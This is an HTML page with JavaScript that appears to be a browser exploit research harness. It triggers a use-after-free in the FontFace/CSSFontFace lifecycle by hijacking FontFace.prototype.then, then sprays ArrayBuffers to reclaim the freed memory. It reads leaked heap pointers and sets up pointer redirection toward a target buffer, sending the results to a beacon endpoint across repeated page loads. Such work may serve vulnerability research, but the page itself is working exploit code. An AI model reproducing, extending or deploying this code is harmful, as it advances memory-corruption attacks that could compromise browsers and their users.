<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1123</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}
#log{white-space:pre-wrap;word-break:break-all}
.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}
.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}
.win{color:#0f0;font-weight:bold;font-size:14px}
</style>
</head><body>
<div id="log"></div>
<script>
var L=document.getElementById('log');
function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}

var sess;
try{sess=JSON.parse(localStorage.getItem('p1123')||'null');}catch(e){sess=null;}
if(!sess)sess={boot:0,hits:0,misses:0,results:[]};
sess.boot++;
try{localStorage.setItem('p1123',JSON.stringify(sess));}catch(e){}

B('P1123-BOOT','b='+sess.boot+'|h='+sess.hits+'|m='+sess.misses);
log('phase','=== P1123: PTR REDIRECT TEST (boot '+sess.boot+') ===');

if(sess.boot>50){
  log('ok','DONE. '+sess.hits+' hits');
  B('P1123-DONE','h='+sess.hits+'|m='+sess.misses);
  for(var i=0;i<sess.results.length;i++)B('P1123-R'+i,sess.results[i]);
}else{

var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
var K=8;var r=sess.boot;
var fired=false,map=null,found=false;

// Pre-allocate a TARGET buffer that the destructor might write to
// If we redirect +88/+104 to point HERE, the destructor's deref writes to our target
var targetAB=new ArrayBuffer(256);
var targetView=new BigUint64Array(targetAB);
// Fill with sentinel pattern
for(var i=0;i<targetView.length;i++){
  targetView[i]=BigInt('0xDEAD'+i.toString(16).padStart(4,'0')+'BEEF0000');
}

// We need the target's ADDRESS. We can get it by:
// 1. Allocate many targets in a row
// 2. Use the HEAP pointers from the UAF (+88/+104) as nearby addresses
// 3. Point +88 to our target buffer

var st=document.createElement('style');
st.textContent="@font-face{font-family:r"+r+";src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st);
var ff=new FontFace('f'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
document.fonts.add(ff);void ff.loaded;

Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
  if(fired)return undefined;fired=true;
  if(st.parentNode)st.remove();
  try{document.fonts.delete(this);}catch(e){}
  document.body.offsetHeight;
  map=[];
  for(var si=0;si<SIZES.length;si++){
    var sz=SIZES[si];
    for(var k=0;k<K;k++)map.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});
  }
  try{document.fonts.check('1em r'+r);}catch(e){}
  return undefined;
},set:function(){}});

document.fonts.load('1em f'+r+', r'+r,'AB').then(function(){},function(){});

for(var t=5;t<=250;t+=2){(function(ms){setTimeout(function(){
  if(found||!map)return;
  for(var bi=20;bi<56;bi++){
    if(!map[bi])continue;
    var b=new BigUint64Array(map[bi].ab);
    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
    if(nz>0&&!found){
      found=true;
      sess.hits++;

      // Read original values
      var origQ0=b[0],origQ11=b[11],origQ13=b[13];
      B('P1123-HIT','r'+r+'|ms='+ms+'|q0='+hex64(origQ0)+'|q11='+hex64(origQ11)+'|q13='+hex64(origQ13));

      // === EXPERIMENT A: Don't write anything, just observe natural wipe ===
      // Read at +30ms and +60ms to see WHEN zeroing happens
      setTimeout(function(){
        var snap30=[];
        for(var q=0;q<b.length;q++){
          if(b[q]!==0n)snap30.push(q+':'+hex64(b[q]));
        }
        B('P1123-T30',snap30.length>0?snap30.join(','):'ALL_ZERO');
      },30);

      setTimeout(function(){
        var snap60=[];
        for(var q=0;q<b.length;q++){
          if(b[q]!==0n)snap60.push(q+':'+hex64(b[q]));
        }
        B('P1123-T60',snap60.length>0?snap60.join(','):'ALL_ZERO');
      },60);

      // === EXPERIMENT B: Read +88 target to see what's there ===
      // The heap pointer at +88 points to another CSSFontFace member
      // Try reading from +88's target address using the SECOND UAF buffer
      // We don't have a way to read arbitrary addresses directly,
      // but we know the heap layout from the pointers

      setTimeout(function(){
        // Snap at 100ms — see if destructor wrote anything NEW
        var snap100=[];
        for(var q=0;q<b.length;q++){
          if(b[q]!==0n)snap100.push(q+':'+hex64(b[q]));
        }
        // Also check if target buffer changed (in case destructor followed a redirect)
        var tgtChanges=[];
        for(var i=0;i<targetView.length;i++){
          var expected=BigInt('0xDEAD'+i.toString(16).padStart(4,'0')+'BEEF0000');
          if(targetView[i]!==expected)tgtChanges.push(i+':'+hex64(targetView[i]));
        }
        var result='snap='+snap100.length+'|tgt='+tgtChanges.length;
        if(snap100.length>0)result+='|'+snap100.join(',');
        if(tgtChanges.length>0)result+='|TGT:'+tgtChanges.join(',');
        sess.results.push(result);
        B('P1123-T100',result);
        try{localStorage.setItem('p1123',JSON.stringify(sess));}catch(e){}
      },100);

      // === EXPERIMENT C: Write refcount=0 at +0 to trigger early dealloc ===
      // If the destructor checks refcount, setting it to 0 might change behavior
      // DO THIS IN A LATER BOOT (after we have baseline data)
      // For now, just observe the natural timing

      try{localStorage.setItem('p1123',JSON.stringify(sess));}catch(e){}
    }
  }
},ms);})(t);}

setTimeout(function(){
  delete FontFace.prototype.then;
  if(!found){
    sess.misses++;
    B('P1123-M','r'+r);
    try{localStorage.setItem('p1123',JSON.stringify(sess));}catch(e){}
  }
},350);

} // end boot check
</script>
</body></html>
